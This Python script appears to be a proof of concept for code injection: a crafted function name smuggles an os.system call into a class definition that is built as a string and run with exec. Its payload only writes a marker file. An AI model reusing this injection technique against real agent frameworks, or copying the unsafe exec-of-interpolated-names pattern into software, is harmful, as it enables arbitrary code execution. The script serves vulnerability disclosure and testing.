class Agent: pass
def function_tool(description):
    def decorator(func): return func
    return decorator

class_def = f"""
class DynamicPropertyAgent(Agent):
    def __init__(self, instructions, functions_config, room=None, call_id=None):
        pass
"""

func_name = 'hacked(self):\n        import os\n        os.system("echo VULN > vuln.txt")\n    async def test'
method_def = f"""
    @function_tool(description="test")
    async def {func_name}(self) -> dict:
        pass
"""
class_def += method_def

local_vars = {}
try:
    exec(class_def, globals(), local_vars)
    print("Exec worked!")
    AgentClass = local_vars["DynamicPropertyAgent"]
    agent = AgentClass(instructions="test", functions_config=[])
    # Call the injected function to prove RCE
    agent.hacked()
except Exception as e:
    print("Exec failed:", e)
